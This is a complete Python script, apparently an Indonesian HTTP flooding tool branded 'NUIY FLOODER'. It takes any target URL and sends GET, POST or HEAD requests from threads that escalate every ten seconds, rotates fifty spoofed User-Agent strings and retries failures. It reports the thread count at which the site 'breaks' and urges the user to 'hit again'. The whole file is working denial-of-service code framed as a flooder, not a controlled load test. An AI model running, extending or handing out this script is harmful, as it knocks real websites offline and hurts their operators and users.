import sys
import time
import random
import threading
import queue
from collections import Counter, deque
from datetime import datetime
import requests
import json
import re

class C:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    CYAN = '\033[96m'
    BOLD = '\033[1m'
    END = '\033[0m'

response_codes = Counter()
rps_history = deque()
total_checks = 0
total_retries = 0
thread_stats = {}
counter_lock = threading.Lock()
print_lock = threading.Lock()
monitor_active = False
MAX_RETRY = 5
CURRENT_THREADS = 2
DEBUG_MODE = True
REPORT_LINES = []
METHOD = "GET"
PAYLOAD = None
TARGET_URL = ""

def log(msg):
    print(msg)
    clean = msg
    for c in [C.GREEN, C.RED, C.YELLOW, C.CYAN, C.BOLD, C.END]: clean = clean.replace(c,'')
    REPORT_LINES.append(clean)

def log_debug(msg):
    print(msg)

def load_file(filename, default_list):
    try:
        with open(filename, 'r', encoding='utf-8') as f:
            lines = [line.strip() for line in f if line.strip()]
        return lines if lines else default_list
    except FileNotFoundError:
        return default_list

def get_status_color(status):
    if status == 200: return C.GREEN
    elif str(status).startswith('3'): return C.YELLOW
    elif str(status).startswith('4') or str(status).startswith('5'): return C.RED
    else: return C.CYAN

def print_rps_chart():
    log(f"\n{C.BOLD}{C.CYAN} GRAFIK RPS LIVE - 20 Detik Terakhir {C.END}")
    if not rps_history: return
    max_rps = max(rps_history) if rps_history else 1
    bar_width = 20
    for i, rps in enumerate(list(rps_history)[-20:]):
        bar_len = int((rps / max_rps) * bar_width) if max_rps > 0 else 0
        bar = '█' * bar_len
        log(f" {i+1:>2}s |{bar:<20}| {rps:.2f} RPS")

def print_bar_chart(data, total):
    log(f"\n{C.BOLD}{C.CYAN} GRAFIK DISTRIBUSI {C.END}")
    max_count = max(data.values()) if data else 1
    bar_width = 30
    for code, count in sorted(data.items(), key=lambda x: x[1], reverse=True):
        color = get_status_color(code)
        persentase = (count / total) * 100 if total > 0 else 0
        bar_len = int((count / max_count) * bar_width)
        bar = '█' * bar_len
        log(f" {str(code):<10} |{bar:<30}| {count:>5} ({persentase:.1f}%)")

def detect_breaking_point():
    for thread_count, stats in sorted(thread_stats.items()):
        total = sum(stats.values())
        if total == 0: continue
        error_rate = ((stats.get("Timeout",0) + stats.get("Error",0) + stats.get(403,0) + stats.get(500,0)) / total) * 100
        if error_rate > 30:
            return thread_count, error_rate
    return None, 0

def save_report(target):
    sanitized = re.sub(r'^https?://', '', target)
    sanitized = re.sub(r'[^a-zA-Z0-9]', '_', sanitized)
    filename = f"NUIY_REPORT_{sanitized}.txt"
    with open(filename, 'w', encoding='utf-8') as f:
        f.write("\n".join(REPORT_LINES))
    log(f"\n{C.GREEN}[✅] Report berhasil disimpan ke: {filename}{C.END}")

def check_worker(job_queue, target, duration, user_agents, timeout_val):
    global total_checks, total_retries, monitor_active, CURRENT_THREADS, TARGET_URL
    if not target.startswith("http://") and not target.startswith("https://"):
        target = "http://" + target
    end_time = time.time() + duration
    session = requests.Session()

    while time.time() < end_time and monitor_active:
        try: _ = job_queue.get(timeout=0.1)
        except queue.Empty: continue
        timestamp = TARGET_URL if TARGET_URL else target
        headers = {'User-Agent': random.choice(user_agents)}
        my_thread_count = CURRENT_THREADS

        for attempt in range(1, MAX_RETRY + 1):
            try:
                if METHOD == "POST":
                    response = session.post(target, headers=headers, json=PAYLOAD, timeout=timeout_val)
                elif METHOD == "HEAD":
                    response = session.head(target, headers=headers, timeout=timeout_val)
                else:
                    response = session.get(target, headers=headers, timeout=timeout_val)
                status = response.status_code
                res_time = round(response.elapsed.total_seconds() * 1000, 2)
                color = get_status_color(status)
                if DEBUG_MODE:
                    with print_lock:
                        tag = f"[{METHOD}]"
                        if attempt > 1:
                            log_debug(f"{C.YELLOW}[🚀-R{attempt}][T{my_thread_count}]{tag}{C.END} {timestamp} | {color}{status}{C.END} | {res_time}ms")
                        else:
                            log_debug(f"{color}[🚀][T{my_thread_count}]{tag}{C.END} {timestamp} | {color}{status}{C.END} | {res_time}ms")
                break
            except requests.exceptions.Timeout:
                if attempt == MAX_RETRY:
                    status = "Timeout"
                    if DEBUG_MODE:
                        with print_lock: log_debug(f"{C.RED}[TO][T{my_thread_count}]{C.END} {timestamp} | {C.RED}Gagal 5x retry{C.END}")
                else:
                    with counter_lock: total_retries += 1
                    time.sleep(0.2 * attempt)
                    continue
            except requests.exceptions.RequestException:
                if attempt == MAX_RETRY:
                    status = "Error"
                    if DEBUG_MODE:
                        with print_lock: log_debug(f"{C.RED}[XX][T{my_thread_count}]{C.END} {timestamp} | {C.RED}Gagal 5x retry{C.END}")
                else:
                    with counter_lock: total_retries += 1
                    time.sleep(0.2 * attempt)
                    continue
        with counter_lock:
            total_checks += 1
            response_codes[status] += 1
            if my_thread_count not in thread_stats: thread_stats[my_thread_count] = Counter()
            thread_stats[my_thread_count][status] += 1
        job_queue.task_done()
        time.sleep(0.05)

def rps_monitor(duration):
    global total_checks
    start = time.time()
    last_checks = 0
    while time.time() < start + duration and monitor_active:
        time.sleep(1)
        with counter_lock: current = total_checks
        rps = current - last_checks
        rps_history.append(rps)
        last_checks = current

def parse_payload(input_str):
    input_str = input_str.strip()
    if not input_str: return {}
    if not input_str.startswith("{"): input_str = "{" + input_str + "}"
    try: return json.loads(input_str)
    except: return {"data": input_str}

def main():
    global monitor_active, CURRENT_THREADS, DEBUG_MODE, METHOD, PAYLOAD, TARGET_URL

    # Banner ASCII "NUIY" warna cyan (tanpa teks tambahan)
    banner = r"""
 ═══════════════════════════════════════════════════════════
                                                          
▄▄▄    ▄▄▄ ▄▄▄  ▄▄▄ ▄▄▄▄▄ ▄▄▄   ▄▄▄   ▄▄▄▄▄▄▄  
████▄  ███ ███  ███  ███  ███   ███   ▀▀▀▀████ 
███▀██▄███ ███  ███  ███  ▀███▄███▀      ▄██▀  
███  ▀████ ███▄▄███  ███    ▀███▀      ▄███▄▄▄ 
███    ███ ▀██████▀ ▄███▄    ███      ████████  💖💜
                                              
═══════════════════════════════════════════════════════════
    """
    log(f"{C.CYAN}{banner}{C.END}")

    target = input("[🎯] Masukkan URL Target: ").strip()
    while not target: target = input("[❌] URL tidak boleh kosong: ").strip()
    TARGET_URL = target

    METHOD = input("[⚡] Method [GET/POST/HEAD] [default GET]: ").strip().upper() or "GET"
    if METHOD == "POST":
        payload_input = input('[📦] Payload JSON [contoh: {"user":"admin"}]: ').strip()
        PAYLOAD = parse_payload(payload_input)

    try:
        duration = int(input("[⏱️] Durasi  (detik): "))
        start_threads = int(input("[👥] Thread Awal [rekomendasi 5]: "))
        max_threads = int(input("[🔥] Thread Maksimal [rekomendasi 200]: "))
        timeout_val = float(input("[⏳] Timeout (detik) [default 5]: ") or 5)
        debug_input = input("[🐛] Debug Mode [ON/OFF] [default ON]: ").strip().upper()
        DEBUG_MODE = False if debug_input == "OFF" else True
    except ValueError:
        log(f"\n{C.RED}[-] Error: Harus angka{C.END}")
        sys.exit(1)

    CURRENT_THREADS = start_threads

    # 50 User-Agent default
    default_ua = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPad; CPU OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 11; SM-G996B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 9; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
        "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)",
        "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0",
        "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
        "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_4_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPad; CPU OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 11; Pixel 4 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 10; Pixel 3 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 9; Pixel 2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Safari/605.1.15",
        "Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
    ]

    user_agents = load_file("user-agent.txt", default_ua)

    monitor_active = True
    job_queue = queue.Queue()
    threads = []
    thread_step = max(1, (max_threads - start_threads) // (duration // 10))
    next_escalation = time.time() + 10

    log(f"\n{C.YELLOW}[*] MODE FLOODER AKTIF{C.END}")
    log(f"Method: {C.CYAN}{METHOD}{C.END} | Debug: {C.GREEN if DEBUG_MODE else C.RED}{debug_input if debug_input else 'ON'}{C.END}")
    if METHOD == "POST": log(f"Payload: {PAYLOAD}")
    log(f"Thread akan naik dari {start_threads} -> {max_threads} tiap 10 detik\n")

    rps_t = threading.Thread(target=rps_monitor, args=(duration,))
    rps_t.daemon = True
    rps_t.start()

    for _ in range(CURRENT_THREADS):
        t = threading.Thread(target=check_worker, args=(job_queue, target, duration, user_agents, timeout_val))
        t.daemon = True
        t.start()
        threads.append(t)

    start_time = time.time()
    try:
        while time.time() < (start_time + duration) and monitor_active:
            if time.time() >= next_escalation and CURRENT_THREADS < max_threads:
                CURRENT_THREADS += thread_step
                CURRENT_THREADS = min(CURRENT_THREADS, max_threads)
                with print_lock: log(f"\n{C.CYAN}{C.BOLD}[💥] ESCALATION UP TO {CURRENT_THREADS} THREAD{C.END}\n")
                for _ in range(thread_step):
                    t = threading.Thread(target=check_worker, args=(job_queue, target, duration, user_agents, timeout_val))
                    t.daemon = True
                    t.start()
                    threads.append(t)
                next_escalation = time.time() + 10
            if job_queue.qsize() < CURRENT_THREADS:
                for _ in range(CURRENT_THREADS * 2): job_queue.put(True)
            time.sleep(0.1)
    except KeyboardInterrupt:
        log(f"\n{C.YELLOW}[*] Dihentikan oleh keadaan{C.END}")
    finally:
        monitor_active = False
        time.sleep(2)
        while not job_queue.empty():
            try:
                job_queue.get_nowait()
                job_queue.task_done()
            except queue.Empty:
                break

    time.sleep(0.5)

    break_thread, break_rate = detect_breaking_point()

    log("\n" + "="*50)
    log(f"{C.BOLD}{C.CYAN} NUIY FLOODER REPORT - {target} {C.END}")
    log("="*50)
    log(f"Target : {target} | Method: {METHOD}")
    log(f"Durasi : {duration}s | Thread: {start_threads} -> {max_threads}")
    log(f"Timeout : {timeout_val}s | Max Retry: {MAX_RETRY}x")
    log(f"Total Checks: {total_checks}")
    log(f"Total Retry : {total_retries}")
    avg_rps = sum(rps_history)/len(rps_history) if rps_history else 0
    log(f"Rata-rata RPS : {round(avg_rps, 2)}")
    if break_thread:
        log(f"{C.RED}{C.BOLD}BREAKPOINT : {break_thread} Thread {C.END}{C.YELLOW}({break_rate:.1f}% error){C.END}")
    else:
        log(f"{C.GREEN}{C.BOLD}BREAKPOINT : Tidak ditemukan. HAJAR LAGI !!!!{C.END}")
    print_rps_chart()
    log("-"*50)
    print_bar_chart(response_codes, total_checks)
    log("\nDistribusi Detail:")
    for code, count in sorted(response_codes.items(), key=lambda x: str(x)):
        persentase = round((count/total_checks)*100, 2)
        log(f" Code {code} : {count} kali ({persentase}%)")
    log("="*50)
    save_report(target)

if __name__ == "__main__":
    main()
